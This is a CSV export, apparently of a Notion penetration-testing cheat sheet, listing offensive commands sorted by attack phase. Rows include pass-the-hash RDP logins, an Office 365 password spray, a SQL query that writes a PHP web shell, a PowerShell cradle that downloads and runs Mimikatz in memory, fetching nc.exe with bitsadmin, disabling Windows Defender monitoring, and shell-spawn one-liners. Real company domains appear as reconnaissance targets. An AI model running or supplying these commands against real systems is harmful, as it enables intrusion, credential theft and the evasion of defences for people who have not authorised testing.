Vector,Security Domains,OS,Description,Target_Technology,URL
RDP Pass the Hash (Disable Restricted Admin Mode),"Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)",Windows,"Enable Restricted Admin Mode: Allow network logon instead of password based. ",rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),https://www.blumira.com/blog/2024-apr-why-are-threat-actors-enabling-windows-restrictedadmin-mode
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA,"Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21)",Linux,xfreerdp Pass the Hash,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
subfinder -d paypal.com -v,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Subdomain Enumeration,dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
,,,,,
host -t MX microsoft.com,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,DNS lookup for mail servers,smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),
"dig mx paypal.com | grep ""MX"" | grep -v "";""",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,DNS lookup for mail servers,smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),
python3 o365spray.py --validate --domain msplaintext.xyz,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Verify the usage of Office365 for the specified domain.,smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),https://github.com/0xZDH/o365spray
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,Office 365 Password Spray,smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),https://github.com/0xZDH/o365spray
Hydra Brute Force SSH,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,POP3 brute force,pop3 (https://www.notion.so/pop3-1444c8e523768094b845e25718ebd32c?pvs=21),
swaks open relay example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,SMTP Open Relay Test,smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21),
net use n: \\192.168.220.129\Finance /user:plaintext Password123,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Access Network Share,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
n:\*secret* /s /b,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Search for file through all sub directories.,,
findstr /s /i cred n:\*.*,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Find a string in multiple files.,,
Powershell Mount Network Drive,"Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)",Windows,Mount Network Drive,"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)",
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Search for files in directories.,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
"Get-ChildItem -Recurse -Path N:\ | Select-String ""cred"" -Lis",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Powershell grep,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,FTP Bounce Attack,ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
patator FTP Brute Force,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Linux,FTP Brute Force,ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),https://github.com/lanjelot/patator
,,,,,
"SELECT ""<?php echo shell_exec($_GET['c']);?>"" INTO OUTFILE '/var/www/html/webshell.php';","Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",Linux,MySQL write to filesystem,mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21),
MSSQL Write to Filesystem,"Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)",Windows,MSSQL Write to filesystem,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
,,,,,
MSSQL Read files from local filesystem.,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,MSSQL Read local Files,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
MSSQL Steal Hashes with Responder,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Windows",MSSQL Steal Hashes with Responder.,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
MSSQL Impersonate User,Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21),Windows,MSSQL Impersonate,mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
,,,,,
,,,,,
RDP Session Hijack RDP Session Hijacking:,"Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)",Windows,RDP Session Hijack,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
"Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name ""DefaultUserName""",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Windows,Query the registry for Autologin,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Set SPN Example,Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21),Windows,Set SPN,"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), PowerView (https://www.notion.so/PowerView-1454c8e523768011a934c27c986b7ef4?pvs=21)",
php://filter/read=convert.base64-encode/resource=config,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21)","PHP, Web",PHP Read local File,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Execute Command via curl and php input filter (GET),Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"PHP, Web",Execute Command via curl and php input filter (GET),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Execute command via curl and php input filter (POST),Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"PHP, Web",Execute Command via curl and php input filter (POST),php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
python -m pyftpdlib -p 21,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"FTP, Linux, Python",Spin up Python server,"python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21)",
impacket-smbserver -smb2support share $(pwd),File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"Impacket, Linux",impacket SMB server,"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Zip File Upload Bypass,"Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)","PHP, Web",Bypass file upload restriction by embedding shell in .zip file.,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Phar File Shell Upload,"Persistence (https://www.notion.so/Persistence-1434c8e523768074b5d4daa95c78dbbb?pvs=21), Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)","PHP, Web",Upload Phar File and reference it,,
LFI Bypass List,LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21),"PHP, Web",LFI Techniques List,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
PHP RCE Examples,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"PHP, Web",RCE PHP Wrappers,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
PHP RFI Examples,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"PHP, Web",RFI PHP Techniques,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
PHP LFI + Upload Examples,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"PHP, Web",LFI + Upload Techniques,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
FFUF Examples,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Web,FFUF Useful Examples,php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21),
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Powershell Download File,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1'),"Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21), File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)",Windows,Powershell: Download and execute file in memory.,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Powershell Upload file after converting it to Base64,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,PowerShell: Upload file,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Download file with bitsadmin,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
"certutil,exe: Download File",File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Download a file with certutil,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
,,,,,
php file download example,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Download a file using php,"php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Copy file from one computer to another: scp,ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
List of Download Cradels,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Download Cradle List,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Set up WebDav,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,WebDave server for file upload,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"Powershell FTP Upload Example
",File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,PowerShell: Upload to FTP Server,"ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)",
‘exec’ download file.,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Use file descriptor to fetch file.,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
HTTPS Python UploadServer Module,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"Linux, Windows",Set up Python Uploadserver. -Uploading with curl and Powershell examples included.,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21)",
ruby -run -ehttpd . -p8000,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Ruby Webserver,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ruby (https://www.notion.so/ruby-1444c8e52376801abb35f1c8328b208f?pvs=21)",
php download file,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),"Linux, PHP",Download a file using PHP,"php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
php download file and pipe to bash,"File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)","Linux, PHP",Download file and execute.,"php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Ruby Download File,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Download a file using Ruby,"ruby (https://www.notion.so/ruby-1444c8e52376801abb35f1c8328b208f?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
perl download file example,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Perl Download file,"perl (https://www.notion.so/perl-1444c8e523768062bda6f424bc78d32c?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Javascript/cscript.exe Download File,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Download a file using cscript.exe,"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), Javascript (https://www.notion.so/Javascript-1444c8e52376800e9015ca6f69087c0e?pvs=21)",
VBScript Download File,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Download a file using VBScript,"PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), VBScript (https://www.notion.so/VBScript-1444c8e5237680a4ba59dae9ce6b70b7?pvs=21)",
HTTP: Python Upload Server,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Spin up Python Upload Server HTTP,"python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)",
Download File /dev/tcp,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Download a file using cat and /dev/tcp,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Powershell Create Session and Copy File,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Powershell: Create session and transfer file,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
xfreedesktop: Mount local folder.,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,Connect over RDP and mount local folder from Linux,rdp (https://www.notion.so/rdp-1444c8e52376801fbd7defc74098df00?pvs=21),
Powershell Encrypt File,Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21),Windows,Encrypt Data,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
OpenSSL HTTPS Web server,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Linux,HTTPS Webserver: OpenSSL,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21)",
BitsAdmin Download file,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,Transfer File using BitsAdmin,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
WinHTTPRequest Download File,File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21),Windows,WinHTTPSRequest File Download,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
PowerShell Download File and Change User Agent,"File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Windows,Powershell Change User Agent,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
SVG XSS Example,Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21),Web,SVG XSS,Javascript (https://www.notion.so/Javascript-1444c8e52376800e9015ca6f69087c0e?pvs=21),
SVG XXE,Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21),Web,SVG XXE,xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21),
XXE Examples,"Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), LFI (https://www.notion.so/LFI-1434c8e523768048913dcfcd434b772b?pvs=21)",Web,XXE Payload List,xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21),
XXE Injector,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Web,XXE Injector GitHub,xxe (https://www.notion.so/xxe-1434c8e523768048ad75f438f64aa482?pvs=21),git clone https://github.com/enjoiz/XXEinjector.git
Jenkins GroovyScript,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Web,GroovyScript RCE,groovyscript (https://www.notion.so/groovyscript-1444c8e52376800a8852d859caab7f27?pvs=21),
Splunk Reverse Shell,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Web,Splunk Reverse Shell,splunk (https://www.notion.so/splunk-1444c8e52376806c8eb0c2ff66e4632a?pvs=21),
ShellShock Test,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),"Linux, Web",ShellShock,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",enumerate based on file created from nmap scan.,HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21),
cat web_discovery.xml | ./aquatone -nmap,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",enumerate based on file created from nmap scan,HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21),
sudo wpscan --url <http://domainnameoripaddress> --enumerate,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",wpscan —enumerate,wordpress (https://www.notion.so/wordpress-1444c8e5237680e78fa3df9e89b4bd65?pvs=21),
wpscan brute-force example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",wpscan brute force,wordpress (https://www.notion.so/wordpress-1444c8e5237680e78fa3df9e89b4bd65?pvs=21),
droopescan scan joomla --url http://<domainnameoripaddress>,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",drupal enumeration,drupal (https://www.notion.so/drupal-1444c8e523768011b91feea2c5207972?pvs=21),https://github.com/SamJoan/droopescan
joomla-brute example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",Joomla Enumeration,joomla (https://www.notion.so/joomla-1444c8e5237680f8979add39119ffb43?pvs=21),https://github.com/ajnik/joomla-bruteforce/tree/master
gobuster example,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",GoBuster Enumeration,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
auxiliary/scanner/http/tomcat_mgr_login,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",Tomcat Brute Force,"metasploit (https://www.notion.so/metasploit-1444c8e5237680e18a59ff8a4a9f4f7c?pvs=21), tomcat (https://www.notion.so/tomcat-1444c8e523768076b6d7c8c5e2f1f55c?pvs=21)",
Tomcate Brute Force: mgr_brute.py,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"Linux, Web",Tomcat Brute Force,tomcat (https://www.notion.so/tomcat-1444c8e523768076b6d7c8c5e2f1f55c?pvs=21),https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
Set-MpPreference -DisableRealtimeMonitoring $true,Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21),Windows,Powershell Disable Real-Time Monitoring,PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
use exploit/windows/smb/psexec,Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21),"Linux, Windows",Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec,metasploit (https://www.notion.so/metasploit-1444c8e5237680e18a59ff8a4a9f4f7c?pvs=21),
msfvenom examples,Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21),Linux,msfvenom payload examples,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Eternal Blue,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Windows,Eternal Blue Exploits,smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
Stabilize Shell,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Stabilize an already existing Reverse Shell,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"perl -e 'exec ""/bin/sh"";'",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Perl Spawn Shell,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), perl (https://www.notion.so/perl-1444c8e523768062bda6f424bc78d32c?pvs=21)",
"ruby: exec ""/bin/sh""",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Ruby Spawn Shell,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), ruby (https://www.notion.so/ruby-1444c8e52376801abb35f1c8328b208f?pvs=21)",
Lua: os.execute('/bin/sh'),Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Lua Spawn Shell,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), Lua (https://www.notion.so/Lua-1444c8e523768072bb15c70cd75b18c8?pvs=21)",
"awk 'BEGIN {system(""/bin/sh"")}'",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Awk Spawn Shell,"Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), awk (https://www.notion.so/awk-1444c8e5237680f89531d4fc3007efd5?pvs=21)",
"find / -name nameoffile 'exec /bin/awk 'BEGIN {system(""/bin/sh"")}' \;",Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Find Spawn Shell,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
find . -exec /bin/sh \; -quit,Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21),Linux,Find Spawn Shell,Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
